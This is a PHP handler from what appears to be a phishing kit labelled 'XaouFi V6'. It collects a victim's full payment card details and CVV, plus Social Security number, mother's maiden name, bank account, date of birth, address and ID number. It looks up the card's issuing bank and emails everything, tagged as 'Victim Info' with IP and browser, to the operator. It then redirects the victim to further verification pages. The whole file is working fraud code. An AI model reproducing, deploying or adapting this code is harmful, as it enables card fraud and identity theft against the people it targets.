<?php

include('../blocker.php');
include('../detect.php');
include('../function.php');
include('../quotes.php');

$datei = fopen("../logsz/cc.txt","r");
$count = fgets($datei,1000);
fclose($datei);
$count=$count + 1 ;

$datei = fopen("../logsz/cc.txt","w");
fwrite($datei, $count);
fclose($datei);

$binq = str_replace(' ', '', $_POST['cc_number']);
$binq = substr($binq, 0, 6);
$bins = file_get_contents("https://www.cardbinlist.com/search.html?bin=$binq");
$bin = preg_match_all("/headline\":\"(.*)\",\"datePublished/xs", $bins, $binn) ? $binn[1][0] : null;
$bin2 = preg_match_all("/caption\":\"BIN(.*)\",\"width\":\"600\",\"height\":\"400\"}}<\/script>/xs", $bins, $binn2) ? $binn2[1][0] : null;
$bin3 = explode(" ",$bin);
$bin4 = explode(" ",$bin2);
$ccbrand = strtoupper($bin3[2]);
$ccbank  = $bin3[5].' '.$bin3[6].' '.$bin3[7];
$cctype  = strtoupper($bin4[3]);
$ccklas  = strtoupper($bin3[3]);
$message =" ".$quote."
++------[ Credit Card by XaouFi V6 ]------++
Cardholder Name :  ".$_POST['cc_holder']."
Card Number     :  ".$_POST['cc_number']."
Expiration Date :  ".$_POST['expdate_month']." / ".$_POST['expdate_year']."
Cvv2            :  ".$_POST['cvv2_number']."
BIN/IIN Info    :  ".$ccbrand." ".$cctype." ".$ccklas." ".$ccbank."
        
++------[ Additional Info ]------++
Sort Code       :  ".$_POST['sort_code1']." - ".$_POST['sort_code2']." - ".$_POST['sort_code3']."
Account number  :  ".$_POST['accnum']."
BSB - OSID      :  " . $_POST['bsbnum_1'] . " - " . $_POST['bsbnum_2'] . "
Credit Limit    :  " . $_POST['cc_limit'] . "
Mother's name   :  ".$_POST['mmd']."
        
++------[ Address Info ]------++
Account Name    :  ".$_POST['full_name']."
Address Line 1  :  ".$_POST['address1']."
Address Line 2  :  ".$_POST['address2']."
City/Town       :  ".$_POST['city']."
State           :  ".$_POST['state']."
Zip/PostCode    :  ".$_POST['postal']."
Country         :  ".$nama_negara."
Phone Number    :  ".$_POST['phone']."
SSN             :  ".$_POST['ssn1']." - ".$_POST['ssn2']." - ".$_POST['ssn3']."
ID Number       :  ".$_POST['id_number']."
DOB             :  ".$_POST['dob_day']." / ".$_POST['dob_month']." / ".$_POST['dob_year']."

++------[ Victim Info ]------++
From            :  ".$ip." | ".$nama_negara." | " . $state . " | " . $kota . " On ".date('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."

++------[ End Of Info ]------++
";
crypto($message);

include('../settings.php');
$subject = "CC - ".$binq." - ".$ccbrand." ".$cctype." ".$ccklas." ".$ccbank." [ ".$nama_negara." | " . $ip . " ]";
$headers = "From: XaouFi V6 <ademaya2003@yandex.com>";
mail($pais_email, $subject, $message, $headers);

$last4 = str_replace(' ', '', $_POST['cc_number']);
$last4 = substr($last4, 12);
if ($pais_vbv == 'vbv_active') {
header("LOCATION: verified.php?locked=account_".$kode_negara."&login_params=checked&email_locked=".$_GET['email_locked']."&trxid=".$last4."&step=four&time=".md5(gmdate('r')).sha1(gmdate('r')));
}else{
header("LOCATION: webscrr.php?locked=account_".$kode_negara."&login_params=checked&email_locked=".$_GET['email_locked']."&step=four&time=".md5(gmdate('r')).sha1(gmdate('r')));
}

?>